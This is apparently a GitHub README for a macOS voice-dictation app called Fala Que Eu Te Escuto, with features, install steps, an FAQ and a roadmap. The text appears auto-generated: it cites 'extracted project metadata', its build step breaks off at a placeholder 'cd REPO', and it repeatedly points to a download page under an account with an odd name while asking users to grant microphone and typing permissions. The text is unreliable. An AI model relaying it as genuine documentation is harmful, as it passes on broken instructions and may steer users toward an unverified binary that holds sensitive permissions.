# Fala Que Eu Te Escuto - Voice Dictation for macOS 2026

> **Fala Que Eu Te Escuto is an offline, local speech-to-text app for macOS. Press and hold the push-to-talk control, speak in Portuguese, English, or Spanish, and the transcription is typed into the application currently in focus.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jasonoqhughes4333/fala-que-eu-te-escuto-app?style=flat-square)](https://github.com/jasonoqhughes4333/fala-que-eu-te-escuto-app)

---

<p align="center">
  <a href="https://jasonoqhughes4333.github.io/fala-que-eu-te-escuto-app/">
    <img src="https://img.shields.io/badge/Download-Fala%20Que%20Eu%20Te%20Escuto%20Latest-brightgreen?style=for-the-badge" alt="Download Fala Que Eu Te Escuto">
  </a>
</p>

> **[Download Fala Que Eu Te Escuto](https://jasonoqhughes4333.github.io/fala-que-eu-te-escuto-app/)**

---

[Download Latest Build](https://jasonoqhughes4333.github.io/fala-que-eu-te-escuto-app/)

---

## What Is Fala Que Eu Te Escuto?

Fala Que Eu Te Escuto brings fast voice input to the macOS desktop. Keep the push-to-talk key pressed while speaking, then release it to place the generated text wherever the cursor is active in the focused application.

Speech recognition takes place on the device and is intended to work without an internet connection. Whisper-based transcription supports Portuguese, English, and Spanish, while the app remains accessible from the macOS menu bar and displays an indicator whenever recording is in progress.

---

## Highlights

- Local speech recognition that does not depend on an online service
- Hold-to-speak push-to-talk operation
- Sends the completed transcription to the active application
- Automatic recognition of Portuguese, English, and Spanish
- On-device transcription powered by Whisper
- Recording status shown on screen during capture
- Runs from the macOS menu bar
- Automatic update functionality
- Packages available for Apple Silicon and Intel Macs
- Windows beta build available

---

## Getting Started

### Download and install

1. Visit the [latest build page](https://jasonoqhughes4333.github.io/fala-que-eu-te-escuto-app/).
2. Select the build appropriate for your computer.
3. Open the application on macOS.
4. Grant the macOS permissions it needs to record dictation and type into the focused application.

### Compile from source

```bash
git clone https://github.com/jasonoqhughes4333/fala-que-eu-te-escuto-app.git
cd REPO
```

The extracted project metadata identifies Rust as part of the project. Follow the build guidance available in the repository, then launch the produced application on macOS.

---

## Using the App

1. Start Fala Que Eu Te Escuto.
2. Keep it available in the macOS menu bar.
3. Select the text field or application that should receive the transcription.
4. Press and hold the configured push-to-talk key.
5. Speak in Portuguese, English, or Spanish.
6. Release the key to finish and insert the recognized text.

A recording indicator appears on screen while audio capture is active.

---

## Configuration Notes

The application is designed around menu bar controls and push-to-talk input. The available metadata does not describe a standalone configuration file or a command-line configuration format.

When the installed build includes a preferences panel, use that panel to change the input or recording settings it exposes.

---

## System Requirements

- macOS
- Apple Silicon or Intel processor
- Microphone permission
- Permission to type into the application currently in focus
- Enough local storage for the application and its speech-recognition components
- Internet access can help with downloading the app or receiving updates, although transcription is designed to run offline
- Windows beta build also available

---

## Frequently Asked Questions

### What languages can it recognize?

The documented automatic language detection covers Portuguese, English, and Spanish.

### Is an internet connection needed for dictation?

No internet connection is intended for the transcription process; recognition is designed to run locally on the device.

### Which operating systems are supported?

The primary experience runs from the macOS menu bar. A Windows beta build is also included among the available platform targets.

### What is the dictation procedure?

First focus the destination app or text field. Hold the push-to-talk key while speaking, then release it when you are done.

### Why does the transcription not appear?

Verify that microphone access and permission to enter text into the focused application have both been granted. Make sure the intended destination field is focused before you begin speaking.

### Does the app update itself?

Automatic updates are included in the feature profile. The exact availability and timing can vary by installed build.

### Can I select a language myself?

The documented behavior uses automatic language detection. The available metadata does not specify a manual language-selection control.

---

## Roadmap

- Maintain the macOS experience on both Apple Silicon and Intel hardware
- Continue refining the Windows beta build
- Keep the dictation workflow local and offline
- Further improve menu bar access and push-to-talk interaction

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
